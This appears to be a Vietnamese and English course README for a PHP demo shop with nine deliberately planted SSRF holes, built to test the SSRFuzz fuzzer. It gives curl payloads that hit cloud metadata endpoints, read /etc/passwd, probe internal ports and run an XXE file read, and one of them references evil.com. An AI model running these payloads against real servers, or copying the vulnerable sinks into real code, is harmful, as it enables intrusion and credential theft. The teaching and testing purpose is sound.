# SSRF Vulnerabilities Map - SSRFuzzShop

## Tổng quan

Web application demo cho NT213 - Bảo mật web và ứng dụng.

- **Tổng số lỗ hổng SSRF:** 9 endpoints
- **Files chứa SSRF:** 4 files (profile.php, contact.php, checkout.php, admin_products.php)
- **PHP sinks sử dụng:** 10 loại khác nhau
- **Công cụ testing:** SSRFuzz (IEEE S&P 2024)
- **Crawlergo compatible:** Tất cả parameters đều discoverable

---

## Chi tiết SSRF Vulnerabilities

### 1. profile.php - 2 vulnerabilities

#### Vuln #1: Upload Avatar from URL
- **Sink:** `getimagesize()` + `file_get_contents()`
- **Parameter:** POST `avatar_url`
- **Test:** `curl -X POST http://localhost/profile.php -d "avatar_url=http://metadata.google.internal/"`

#### Vuln #2: Import Profile JSON
- **Sink:** `file_get_contents()` + `json_decode()`
- **Parameter:** POST `import_json`
- **Test:** `curl -X POST http://localhost/profile.php -d "import_json=http://internal-api/data.json"`

---

### 2. contact.php - 2 vulnerabilities

#### Vuln #3: Attach File from URL
- **Sink:** `readfile()`
- **Parameter:** POST `attachment_url`
- **Test:** `curl -X POST http://localhost/contact.php -d "attachment_url=file:///etc/passwd"`

#### Vuln #4: External Verification Service
- **Sink:** `file()`
- **Parameter:** POST `verify_captcha`
- **Test:** `curl -X POST http://localhost/contact.php -d "verify_captcha=http://captcha-api.internal/verify"`

---

### 3. checkout.php - 2 vulnerabilities

#### Vuln #5: Payment Gateway Verify
- **Sink:** `get_headers()`
- **Parameter:** GET `payment_verify`
- **Test:** `?payment_verify=http://internal-payment-gateway:9200/_cluster/health`

#### Vuln #6: Shipping Rate API
- **Sink:** `fsockopen()`
- **Parameter:** POST `shipping_api`
- **Test:** `curl -X POST http://localhost/checkout.php -d "shipping_api=http://127.0.0.1:6379/"`

---

### 4. admin_products.php - 3 vulnerabilities

#### Vuln #7: Validate Image/XML
- **Sink:** `simplexml_load_file()` / `imagecreatefromstring()`
- **Parameter:** GET `validate_image`
- **Test (XXE):** `?validate_image=http://evil.com/xxe.xml`
- **Test (Image):** `?validate_image=http://internal-storage/secret.png`

#### Vuln #8: Sync Product from Supplier
- **Sink:** `file_get_contents()`
- **Parameter:** GET `sync_product`
- **Test:** `?sync_product=http://api.shopee.vn/product/12345`
- **Purpose:** Đồng bộ thông tin sản phẩm từ nhà cung cấp (Shopee, Lazada, 1688)

#### Vuln #9: Check Warehouse Stock
- **Sink:** `curl_exec()`
- **Parameter:** GET `check_warehouse`
- **Test:** `?check_warehouse=http://warehouse-internal.local/api/stock/SKU123`
- **Purpose:** Kiểm tra số lượng hàng tồn kho từ hệ thống quản lý kho

---

## SSRF Sinks Coverage

| Sink Function | Files | Status |
|--------------|-------|--------|
| `file_get_contents()` | profile.php, admin_products.php | ✅ |
| `curl_exec()` | admin_products.php | ✅ |
| `getimagesize()` | profile.php | ✅ |
| `readfile()` | contact.php | ✅ |
| `file()` | contact.php | ✅ |
| `get_headers()` | checkout.php | ✅ |
| `fsockopen()` | checkout.php | ✅ |
| `simplexml_load_file()` | admin_products.php | ✅ |
| `imagecreatefromstring()` | admin_products.php | ✅ |
| `json_decode()` | profile.php, admin_products.php | ✅ |

**Coverage:** 10/86 sinks từ SSRFuzz research (11.6%)

---

## Test Cases

### Case 1: AWS Metadata SSRF
```bash
curl "http://localhost/admin_products.php?sync_product=http://169.254.169.254/latest/meta-data/"
```

### Case 2: Port Scanning
```bash
curl "http://localhost/admin_products.php?check_warehouse=http://127.0.0.1:22/"
```

### Case 3: XXE Attack
```bash
# Tạo xxe.xml
cat > /tmp/xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF

# Test
curl -X POST http://localhost/admin_products.php -d "validate_image=http://localhost:8000/xxe.xml"
```

### Case 4: Local File Read
```bash
curl "http://localhost/admin_products.php?sync_product=file:///etc/passwd"
```

---

## Crawlergo Discovery

Tất cả 9 parameters đều có trong HTML:

| File | Parameter | Method | Discovery |
|------|-----------|--------|-----------|
| profile.php | avatar_url | POST | Visible input |
| profile.php | import_json | POST | Hidden input |
| contact.php | attachment_url | POST | Hidden input |
| contact.php | verify_captcha | POST | Hidden input |
| checkout.php | payment_verify | GET | Hidden link |
| checkout.php | shipping_api | POST | Hidden input |
| admin_products.php | validate_image | GET | onclick button + --form-values |
| admin_products.php | sync_product | GET | onclick button + --form-values |
| admin_products.php | check_warehouse | GET | onclick button + --form-values |

**Discovery rate: 9/9 (100%)**

**Cách chạy crawlergo:**
```bash
crawlergo -c /usr/bin/chromium-browser --log-level debug -t 20 -m 200 --event-trigger-mode sync --event-trigger-interval 200ms --before-exit-delay 10s --output-mode json http://localhost:8000/
```

**Giải thích options:**
- `-c /usr/bin/chromium-browser` - Sử dụng Chrome/Chromium
- `--log-level debug` - Hiển thị log chi tiết
- `-t 20` - Timeout 20 giây
- `-m 200` - Max requests 200
- `--event-trigger-mode sync` - **Tự động click buttons và trigger events**
- `--event-trigger-interval 200ms` - Chờ 200ms giữa mỗi event
- `--before-exit-delay 10s` - Chờ 10s để page load xong
- `--output-mode json` - Xuất kết quả dạng JSON

---

## References

- **SSRFuzz Paper:** IEEE S&P 2024 - "Where URLs Become Weapons"
- **GitHub:** https://github.com/SSRFuzz/SSRFuzz
- **TaintInfer:** https://github.com/SSRFuzz/TaintInfer

---

## Disclaimer

**CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP!**

Các lỗ hổng được thêm cố ý để nghiên cứu fuzzing. KHÔNG deploy lên production.

---

**Generated for:** NT213 - Web & Application Security  
**Date:** December 2025
